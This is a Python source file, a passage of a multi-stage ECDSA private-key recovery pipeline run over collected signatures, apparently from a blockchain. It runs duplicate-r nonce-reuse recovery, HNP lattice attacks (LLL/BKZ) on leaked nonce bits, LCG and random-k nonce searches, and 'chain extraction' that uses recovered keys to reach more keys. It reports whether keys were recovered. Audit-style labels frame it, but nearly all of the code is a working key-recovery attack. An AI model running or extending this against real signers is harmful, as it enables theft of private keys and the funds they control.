    # Stage0 duplicate-r focus should not blindly override broader cluster-selected input.
    # Only use it as primary recover input when there is nontrivial duplicate-r structure.
    if stage0_subset_info and stage0_subset_info.get("selected_signatures", 0) > 0:
        print(
            "Stage0 duplicate-r focus:",
            f"groups={stage0_subset_info.get('duplicate_r_groups', 0)}",
            f"nontrivial={stage0_subset_info.get('nontrivial_duplicate_r_groups', 0)}",
            f"same_r_diff_s={stage0_subset_info.get('same_r_diff_s_groups', 0)}",
            f"cross_pub={stage0_subset_info.get('cross_pub_duplicate_r_groups', 0)}",
            f"selected={stage0_subset_info.get('selected_signatures', 0)}",
            f"recoverable_focus={stage0_subset_info.get('selected_signatures_recoverable_focus', 0)}",
            f"replay_like={stage0_subset_info.get('selected_signatures_replay_like', 0)}",
        )
        if int(stage0_subset_info.get("nontrivial_duplicate_r_groups", 0)) > 0:
            print("Stage0 has nontrivial duplicate-r; running dedicated recovery on recoverable-focus rows.")
        else:
            print("Stage0 is replay-like only; keeping broader recover_input for stage1.")

        pair_diag_input = stage0_recoverable_path if stage0_recoverable_path.exists() else stage0_path
        duplicate_r_pair_report = build_duplicate_r_pair_diagnostics(
            sig_path=pair_diag_input,
            out_path=Path(args.duplicate_r_pair_report),
        )
        duplicate_r_pair_summary = summarize_duplicate_r_pair_diagnostics(duplicate_r_pair_report)
        print(
            "Duplicate-r pair diagnostics:",
            f"direct_valid_pairs={duplicate_r_pair_report.get('direct_valid_pairs', 0)}",
            f"cross_pub_pairs={duplicate_r_pair_report.get('cross_pub_pairs', 0)}",
            f"report={args.duplicate_r_pair_report}",
        )

    hnp_leak_report = build_explicit_hnp_leak_subset(
        sig_path=sigs,
        out_path=Path(args.hnp_leaks_out),
        report_path=Path(args.hnp_leak_report),
        bits_known=args.hnp_bits_known,
        leakage_model=args.hnp_leakage_model,
    )
    hnp_bounded_k_report = generate_explicit_leak_k_candidates(
        leak_path=Path(args.hnp_leaks_out),
        out_path=Path(args.hnp_bounded_k_out),
        report_path=Path(args.hnp_bounded_k_report),
        bits_known=args.hnp_bits_known,
        leakage_model=args.hnp_leakage_model,
        max_unknown_bits=args.hnp_bruteforce_unknown_bits,
        max_total_candidates=args.hnp_bruteforce_max_candidates,
    )

    # Always attempt HNP/LLL/BKZ when recovery is enabled, but only on
    # normalized explicit leak rows. HNP is not run on inferred anomalies.
    hnp_input = args.hnp_leaks_out
    if stage0_subset_info and stage0_subset_info.get("duplicate_r_groups", 0) > 0:
        if int(stage0_subset_info.get("nontrivial_duplicate_r_groups", 0)) == 0:
            print("Duplicate-r groups are replay-like only (no same-r/diff-s); continuing with HNP + staged recovery.")
        else:
            print("[HNP/LLL/BKZ] Checking explicit nonce-leak subset alongside nontrivial duplicate-r evidence...")
    else:
        print("[HNP/LLL/BKZ] Checking explicit nonce-leak subset...")
    hnp_candidates = try_hnp_lll_bkz_solver(
        hnp_input,
        bits_known=args.hnp_bits_known,
        q=None,
        out_path=args.hnp_candidates_out,
        report_path=args.hnp_report_out,
        timeout_sec=args.hnp_timeout_sec,
        min_leaks=args.hnp_min_leaks,
    )
    nonce_hypothesis_report = run_nonce_hypothesis_generator(args, hnp_input)
    preload_k_paths = []
    if args.preload_k_candidates:
        preload_k_paths.append(Path(args.preload_k_candidates))
    if int(hnp_bounded_k_report.get("total_candidates", 0) or 0) > 0:
        preload_k_paths.append(Path(args.hnp_bounded_k_out))
    if nonce_hypothesis_report.get("enabled"):
        preload_k_paths.append(Path(args.nonce_hypothesis_out))
    merged_preload_k = merge_preload_k_files(preload_k_paths, Path(args.combined_preload_k_out))
    if merged_preload_k is not None:
        args.preload_k_candidates = str(merged_preload_k)
    external_candidate_args, external_candidate_report = build_external_candidate_args(args)
    if nonce_hypothesis_report.get("enabled"):
        external_candidate_report["nonce_hypotheses"] = nonce_hypothesis_report
    candidate_evidence_available = bool(
        external_candidate_report.get("enabled")
        or (hnp_candidates and len(hnp_candidates) > 0)
        or int(nonce_hypothesis_report.get("matched_candidates", 0) or 0) > 0
    )

    # Multi-stage recovery:
    # stage1: primary/cheap scan (disable LCG + no random-k)
    # stage2: enable LCG/delta if anomaly signal is strong
    # stage3: optional random-k budget, only on strongest signals
    stage_runs = []
    pre_recover_validation = post_validate_recovered(Path(args.recover_json_out))
    strong_signal = (
        risk >= max(args.risk_threshold, 80)
        or cross_pub_dup_r > 0
        or dup_r > 0
        or drift_flags > 0
        or sighash_anomaly
        or signer_drift_flagged > 0
    )
    known_nonce_rows = known_nonce_rows_all
    recovery_viability = recovery_viability_label(
        stage0_subset_info=stage0_subset_info,
        known_nonce_rows=known_nonce_rows,
        min_hnp_leaks=args.hnp_min_leaks,
        dup_r=dup_r,
        cross_pub_dup_r=cross_pub_dup_r,
        strong_signal=strong_signal,
        external_candidate_requested=candidate_evidence_available,
    )
    stage1_threads = args.threads
    stage1_iter = max(1, args.max_iter)
    if low_quality_data and not args.exhaustive_recover:
        stage1_threads = max(1, min(args.threads, 4))
        stage1_iter = 1

    # Direct duplicate-r recovery is algebraically stronger than cluster heuristics.
    # Run it on the full duplicate-r focus subset before any broader clustered stage,
    # because cluster gating can legitimately omit the exact same-r/different-s rows.
    if (
        stage0_subset_info
        and int(stage0_subset_info.get("nontrivial_duplicate_r_groups", 0) or 0) > 0
        and int(stage0_subset_info.get("selected_signatures_recoverable_focus", 0) or 0) > 0
    ):
        stage0_extra = ["--no-lcg", "--scan-random-k", "0", "--min-count", "1"] + external_candidate_args
        stage0_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=str(stage0_recoverable_path),
            threads=stage1_threads,
            max_iter=1,
            stage_name="stage0-dup-r-direct",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=stage0_extra,
        )
        stage_runs.append({"name": "stage0-dup-r-direct", "rc": stage0_rc})
        if stage0_rc != 0:
            raise RuntimeError(f"Recover stage0 duplicate-r failed with exit code {stage0_rc}")
        stage0_post_validation = post_validate_recovered(Path(args.recover_json_out))
        stage0_new_valid_rows = (
            int(stage0_post_validation["valid_rows"]) - int(pre_recover_validation["valid_rows"])
        )
        stage0_pre_valid_rows = int(pre_recover_validation.get("valid_rows", 0))
        stage0_post_valid_rows = int(stage0_post_validation.get("valid_rows", 0))
        if args.stage0_only or (args.stop_after_stage0_hit and stage0_new_valid_rows > 0):
            write_candidate_validation_report(
                Path(args.candidate_validation_report),
                external_candidate_report,
                pre_recover_validation,
                stage0_post_validation,
            )
            stage0_material_summary = recovery_material_summary(
                external_candidate_report,
                pre_recover_validation,
                stage0_post_validation,
            )
            stop_reason = "stage0_only" if args.stage0_only else "stage0_hit"
            print(
                "Recovery automation stopped after Stage0.",
                f"reason={stop_reason}",
                f"new_valid_rows={stage0_material_summary['new_local_recovered_rows']}",
            )
            write_decision(args.decision_out, {
                "should_recover": True,
                "recover_executed": True,
                "search_attempted": True,
                "stopped_after_stage0": True,
                "stage0_stop_reason": stop_reason,
                "recovery_viability": recovery_viability,
                "known_nonce_rows": known_nonce_rows,
                "external_candidate_requested": external_candidate_requested,
                "candidate_evidence_available": candidate_evidence_available,
                "exhaustive_recover": args.exhaustive_recover,
                "hnp_candidate_rows": len(hnp_candidates or []),
                "external_candidate_validation": external_candidate_report,
                "key_recovered": stage0_material_summary["key_recovered"],
                "new_key_recovered": stage0_material_summary["new_key_recovered"],
                "valid_recovered_material_present": stage0_material_summary["valid_recovered_material_present"],
                "recovery_outcome": stage0_material_summary["recovery_outcome"],
                "no_new_key_reason": stage0_material_summary["no_new_key_reason"],
                "new_local_recovered_rows": stage0_material_summary["new_local_recovered_rows"],
                "key_material_present": stage0_material_summary["key_material_present"],
                "pre_existing_valid_recovered_rows": stage0_material_summary["pre_existing_valid_recovered_rows"],
                "preloaded_valid_recovered_rows": stage0_material_summary["preloaded_valid_recovered_rows"],
                "cycle_valid_recovered_rows": stage0_material_summary["cycle_valid_recovered_rows"],
                "total_valid_recovered_rows": stage0_material_summary["total_valid_recovered_rows"],
                "duplicate_r_pair_diagnostics": duplicate_r_pair_summary,
                "risk_score": risk,
                "risk_verdict": verdict,
                "duplicate_r": dup_r,
                "cross_pub_duplicate_r": cross_pub_dup_r,
                "drift_flags": drift_flags,
                "sighash_anomaly": sighash_anomaly,
                "signal_fusion_tier": fusion_tier,
                "signal_fusion_confidence": fusion_conf,
                "signal_fusion_recommendation": fusion_reco,
                "verification_quality": vq,
                "low_quality_data": low_quality_data,
                "cluster_fallback_used": cluster_fallback_used,
                "target_filter": target_filter_info,
                "source_sigs": str(original_sigs),
                "effective_cluster_risk_threshold": effective_cluster_threshold,
                "recover_input": str(stage0_recoverable_path),
                "cluster_gating_used": not args.disable_cluster_gating,
                "recover_stages": stage_runs,
                "stage0_subset": stage0_subset_info,
                "post_recover_validation": stage0_post_validation,
            })
            try:
                Path(args.baseline_report).write_text(
                    Path(args.audit_report).read_text(encoding="utf-8"),
                    encoding="utf-8",
                )
            except Exception:
                pass
            return

    stage1_extra = ["--no-lcg", "--scan-random-k", "0"] + external_candidate_args
    if dup_r > 0:
        stage1_extra += ["--min-count", "1"]
    stage1_rc = run_recover_stage(
        recover_bin=args.recover_bin,
        recover_input=recover_input,
        threads=stage1_threads,
        max_iter=stage1_iter,
        stage_name="stage1-primary",
        recover_json_out=args.recover_json_out,
        recover_txt_out=args.recover_txt_out,
        recover_k_out=args.recover_k_out,
        recover_deltas_out=args.recover_deltas_out,
        recover_collisions_out=args.recover_collisions_out,
        recover_clusters_out=args.recover_clusters_out,
        extra_args=stage1_extra,
    )
    stage_runs.append({"name": "stage1-primary", "rc": stage1_rc})
    if stage1_rc != 0:
        raise RuntimeError(f"Recover stage1 failed with exit code {stage1_rc}")

    relation_subset_report: dict[str, Any] | None = None
    relation_input = recover_input
    if allow_advanced and strong_signal:
        relation_subset_report = build_signer_relation_neighborhood_subset(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.relation_neighborhood_out),
            report_path=Path(args.relation_neighborhood_report),
            min_sigs=args.relation_min_sigs,
            max_signers=args.relation_max_signers,
            max_rows_per_signer=args.relation_max_rows_per_signer,
            neighbor_window=args.relation_neighbor_window,
        )
        if int(relation_subset_report.get("selected_rows", 0) or 0) >= 2:
            relation_input = args.relation_neighborhood_out
            print(
                "Relation neighborhood focus:",
                f"selected_rows={relation_subset_report.get('selected_rows', 0)}",
                f"selected_signers={relation_subset_report.get('selected_signers', 0)}",
            )
        else:
            print("Relation neighborhood focus is empty; using primary recovery input for relation scans.")

    if allow_advanced and strong_signal:
        if low_quality_data and not args.exhaustive_recover:
            # Constrained advanced pass for low-quality datasets:
            # keep compute bounded but still allow deeper search than stage1-only.
            stage2_threads = min(max(2, args.threads), 4)
            stage2_iter = 1
        else:
            stage2_threads = min(max(2, args.threads), 16)
            stage2_iter = max(args.max_iter, 2)
            if fusion_tier == "critical":
                stage2_iter = max(stage2_iter, 3)
        stage2_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=relation_input,
            threads=stage2_threads,
            max_iter=stage2_iter,
            stage_name="stage2-lcg-delta",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=["--scan-random-k", "0"] + structured_relation_args(args) + external_candidate_args,
        )
        stage_runs.append({"name": "stage2-lcg-delta", "rc": stage2_rc, "input": relation_input})
        if stage2_rc != 0:
            raise RuntimeError(f"Recover stage2 failed with exit code {stage2_rc}")

        if (
            args.random_k_budget > 0
            and (
                args.exhaustive_recover
                or (
                    not low_quality_data
                    and (cross_pub_dup_r > 0 or drift_flags > 0 or risk >= 120)
                )
            )
        ):
            stage3_input = recover_input
            strong_subset = Path(args.strong_signal_out)
            selected = build_strong_signal_subset_from_cluster_report(
                sig_path=Path(relation_input),
                cluster_report_path=Path(args.cluster_report),
                out_path=strong_subset,
            )
            if selected > 0:
                stage3_input = str(strong_subset)
            stage3_rc = run_recover_stage(
                recover_bin=args.recover_bin,
                recover_input=stage3_input,
                threads=min(max(2, args.threads), 16),
                max_iter=max(args.max_iter, 3 if fusion_tier == "critical" else 2),
                stage_name="stage3-random-k",
                recover_json_out=args.recover_json_out,
                recover_txt_out=args.recover_txt_out,
                recover_k_out=args.recover_k_out,
                recover_deltas_out=args.recover_deltas_out,
                recover_collisions_out=args.recover_collisions_out,
                recover_clusters_out=args.recover_clusters_out,
                extra_args=[
                    "--scan-random-k", str(args.random_k_budget),
                ] + structured_relation_args(args) + external_candidate_args,
            )
            stage_runs.append({"name": "stage3-random-k", "rc": stage3_rc})
            if stage3_rc != 0:
                raise RuntimeError(f"Recover stage3 failed with exit code {stage3_rc}")

    post_validation = post_validate_recovered(Path(args.recover_json_out))
    new_valid_rows = int(post_validation["valid_rows"]) - int(pre_recover_validation["valid_rows"])
    if (
        args.full_scan_fallback
        and recover_input != str(sigs)
        and (strong_signal or args.exhaustive_recover)
        and (args.exhaustive_recover or post_validation["valid_rows"] <= pre_recover_validation["valid_rows"])
    ):
        if args.exhaustive_recover:
            print("Exhaustive recovery enabled; running full-input fallback even after filtered-stage hits.")
        else:
            print("Filtered recovery yielded no new valid rows; escalating to full-input fallback.")
        fallback_iter = max(args.max_iter, args.fallback_max_iter)
        fallback_threads = min(max(2, args.threads), 16)
        if fusion_tier == "critical":
            fallback_iter = max(fallback_iter, 4)
        fallback_relation_input = relation_input
        if relation_subset_report is not None and int(relation_subset_report.get("selected_rows", 0) or 0) < 2:
            fallback_relation_input = str(sigs)
        fallback_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=fallback_relation_input,
            threads=fallback_threads,
            max_iter=fallback_iter,
            stage_name="fallback-full-lcg-delta",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=structured_relation_args(args) + external_candidate_args,
        )
        stage_runs.append({"name": "fallback-full-lcg-delta", "rc": fallback_rc, "input": fallback_relation_input})
        if fallback_rc != 0:
            raise RuntimeError(f"Recover full-input fallback failed with exit code {fallback_rc}")

        fallback_random_budget = max(0, int(args.fallback_random_k_budget))
        if fallback_random_budget > 0:
            fallback_random_input = ""
            strong_subset = Path(args.strong_signal_out)
            strong_subset_source = (
                Path(recover_input)
                if recover_input != str(sigs) and Path(recover_input).exists()
                else sigs
            )
            selected = build_strong_signal_subset_from_cluster_report(
                sig_path=strong_subset_source,
                cluster_report_path=Path(args.cluster_report),
                out_path=strong_subset,
            )
            if selected > 0:
                fallback_random_input = str(strong_subset)
                print(
                    "Random-k fallback constrained to strong-signal subset:",
                    f"selected_signatures={selected}",
                )
            elif recover_input != str(sigs) and Path(recover_input).exists():
                fallback_random_input = recover_input
                print("Random-k fallback constrained to filtered recovery input.")

            if fallback_random_input:
                fallback_random_rc = run_recover_stage(
                    recover_bin=args.recover_bin,
                    recover_input=fallback_random_input,
                    threads=fallback_threads,
                    max_iter=max(fallback_iter, 4 if fusion_tier == "critical" else 3),
                    stage_name="fallback-targeted-random-k",
                    recover_json_out=args.recover_json_out,
                    recover_txt_out=args.recover_txt_out,
                    recover_k_out=args.recover_k_out,
                    recover_deltas_out=args.recover_deltas_out,
                    recover_collisions_out=args.recover_collisions_out,
                    recover_clusters_out=args.recover_clusters_out,
                    extra_args=[
                        "--scan-random-k", str(fallback_random_budget),
                    ] + structured_relation_args(args) + external_candidate_args,
                )
                stage_runs.append(
                    {
                        "name": "fallback-targeted-random-k",
                        "rc": fallback_random_rc,
                        "input": fallback_random_input,
                    }
                )
                if fallback_random_rc != 0:
                    raise RuntimeError(
                        f"Recover targeted random-k fallback failed with exit code {fallback_random_rc}"
                    )
            else:
                print(
                    "Skipping random-k fallback: no targeted subset available; "
                    "full-corpus random-k is not cost-effective."
                )
                stage_runs.append(
                    {
                        "name": "fallback-targeted-random-k",
                        "rc": None,
                        "skipped": True,
                        "reason": "no_targeted_input",
                    }
                )
        post_validation = post_validate_recovered(Path(args.recover_json_out))
        new_valid_rows = int(post_validation["valid_rows"]) - int(pre_recover_validation["valid_rows"])

    chain_report: dict[str, Any] | None = None
    if args.enable_chain_extraction and int(post_validation.get("valid_rows", 0) or 0) > 0:
        chain_pre_validation = post_validation
        graph_report = build_recovery_graph_focus_subset(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.recovery_graph_subset_out),
            report_path=Path(args.recovery_graph_report),
        )
        chain_input = str(sigs)
        if int(graph_report.get("selected_rows", 0) or 0) > 0:
            chain_input = str(Path(args.recovery_graph_subset_out))
            print(
                "Recovery graph focus:",
                f"selected_rows={graph_report.get('selected_rows', 0)}",
                f"known_pubkeys={graph_report.get('known_recovered_pubkeys', 0)}",
                f"known_r={graph_report.get('known_recovered_r', 0)}",
            )
        else:
            print("Recovery graph focus is empty; falling back to full-input chain extraction.")
        chain_rc = run_recover_stage(
            recover_bin=args.recover_bin,
            recover_input=chain_input,
            threads=min(max(2, args.threads), 16),
            max_iter=max(1, int(args.chain_max_iter)),
            stage_name="stage-chain-extract-graph",
            recover_json_out=args.recover_json_out,
            recover_txt_out=args.recover_txt_out,
            recover_k_out=args.recover_k_out,
            recover_deltas_out=args.recover_deltas_out,
            recover_collisions_out=args.recover_collisions_out,
            recover_clusters_out=args.recover_clusters_out,
            extra_args=["--no-lcg", "--scan-random-k", "0", "--min-count", "1"],
        )
        stage_runs.append({"name": "stage-chain-extract-graph", "rc": chain_rc, "input": chain_input})
        if chain_rc != 0:
            raise RuntimeError(f"Recover chain extraction failed with exit code {chain_rc}")
        post_validation = post_validate_recovered(Path(args.recover_json_out))
        new_valid_rows = int(post_validation["valid_rows"]) - int(pre_recover_validation["valid_rows"])
        chain_report = build_recovery_chain_report(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.recovery_chain_report),
        )
        chain_report["new_valid_rows_from_chain_stage"] = max(
            0,
            int(post_validation.get("valid_rows", 0) or 0)
            - int(chain_pre_validation.get("valid_rows", 0) or 0),
        )
        chain_report["recovery_graph_focus"] = graph_report
        chain_report["recovery_graph_expansion"] = build_recovery_graph_expansion_report(
            graph_subset_path=Path(args.recovery_graph_subset_out),
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            pre_validation=chain_pre_validation,
            post_validation=post_validation,
            out_path=Path(args.recovery_graph_expansion_report),
        )
    elif args.enable_chain_extraction:
        graph_report = build_recovery_graph_focus_subset(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.recovery_graph_subset_out),
            report_path=Path(args.recovery_graph_report),
        )
        chain_report = build_recovery_chain_report(
            sig_path=sigs,
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            out_path=Path(args.recovery_chain_report),
        )
        chain_report["skipped_chain_stage"] = "no_valid_recovered_keys"
        chain_report["recovery_graph_focus"] = graph_report
        chain_report["recovery_graph_expansion"] = build_recovery_graph_expansion_report(
            graph_subset_path=Path(args.recovery_graph_subset_out),
            recovered_json_path=Path(args.recover_json_out),
            recovered_k_path=Path(args.recover_k_out),
            pre_validation=post_validation,
            post_validation=post_validation,
            out_path=Path(args.recovery_graph_expansion_report),
        )

    pre_valid_rows = int(pre_recover_validation.get("valid_rows", 0))
    post_valid_rows = int(post_validation.get("valid_rows", 0))
    material_summary = recovery_material_summary(
        external_candidate_report,
        pre_recover_validation,
        post_validation,
    )

    write_candidate_validation_report(
        Path(args.candidate_validation_report),
        external_candidate_report,
        pre_recover_validation,
        post_validation,
    )

    print(f"Recovery automation complete. input={recover_input}")
    write_decision(args.decision_out, {
        "should_recover": True,
        "recover_executed": True,
        "search_attempted": True,
        "recovery_viability": recovery_viability,
        "known_nonce_rows": known_nonce_rows,
        "external_candidate_requested": external_candidate_requested,
        "candidate_evidence_available": candidate_evidence_available,
        "exhaustive_recover": args.exhaustive_recover,
        "hnp_candidate_rows": len(hnp_candidates or []),
        "external_candidate_validation": external_candidate_report,
        "key_recovered": material_summary["key_recovered"],
        "new_key_recovered": material_summary["new_key_recovered"],
        "valid_recovered_material_present": material_summary["valid_recovered_material_present"],
        "recovery_outcome": material_summary["recovery_outcome"],
        "no_new_key_reason": material_summary["no_new_key_reason"],
        "new_local_recovered_rows": material_summary["new_local_recovered_rows"],
        "key_material_present": material_summary["key_material_present"],
        "pre_existing_valid_recovered_rows": material_summary["pre_existing_valid_recovered_rows"],
        "preloaded_valid_recovered_rows": material_summary["preloaded_valid_recovered_rows"],
        "cycle_valid_recovered_rows": material_summary["cycle_valid_recovered_rows"],
        "total_valid_recovered_rows": material_summary["total_valid_recovered_rows"],
        "duplicate_r_pair_diagnostics": duplicate_r_pair_summary,
        "risk_score": risk,
        "risk_verdict": verdict,
        "duplicate_r": dup_r,
        "cross_pub_duplicate_r": cross_pub_dup_r,
        "drift_flags": drift_flags,
        "sighash_anomaly": sighash_anomaly,
        "signal_fusion_tier": fusion_tier,
        "signal_fusion_confidence": fusion_conf,
        "signal_fusion_recommendation": fusion_reco,
        "verification_quality": vq,
        "low_quality_data": low_quality_data,
        "cluster_fallback_used": cluster_fallback_used,
        "target_filter": target_filter_info,
        "source_sigs": str(original_sigs),
        "effective_cluster_risk_threshold": effective_cluster_threshold,
        "recover_input": recover_input,
        "cluster_gating_used": not args.disable_cluster_gating,
        "recover_stages": stage_runs,
        "stage0_subset": stage0_subset_info,
        "hnp_leak_report": hnp_leak_report,
        "hnp_bounded_k_report": hnp_bounded_k_report,
        "relation_neighborhood_report": relation_subset_report,
        "recovery_chain_report": chain_report,
        "post_recover_validation": post_validation,
    })
    try:
        Path(args.baseline_report).write_text(Path(args.audit_report).read_text(encoding="utf-8"), encoding="utf-8")
    except Exception:
        pass


if __name__ == "__main__":
    main()
